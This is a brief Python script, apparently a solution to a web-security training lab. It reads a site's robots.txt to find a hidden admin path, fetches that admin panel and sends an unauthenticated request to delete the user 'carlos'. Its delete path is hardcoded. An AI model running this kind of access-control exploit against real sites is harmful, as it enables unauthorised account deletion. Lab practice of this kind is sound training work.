import requests
import re

target_URl="YOUR_URL"

headers={
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br"
}

get_robots=requests.get(target_URl+"/robots.txt",headers=headers)
match = re.search(r"Disallow:\s*(.*)", get_robots.text, re.IGNORECASE)
if match:
    hidden_path=match.group(1).strip()
    print(hidden_path)

get_admin=requests.get(target_URl+hidden_path,headers=headers)
print(get_admin.text)

print("=== Tien hanh xoa user carlos ===")
del_carlos=requests.get(target_URl+"/administrator-panel/delete?username=carlos",headers=headers,allow_redirects=True)
if del_carlos.status_code==200:
    print("Delete carlos successfully")
else:
    print("Delete carlos failed")
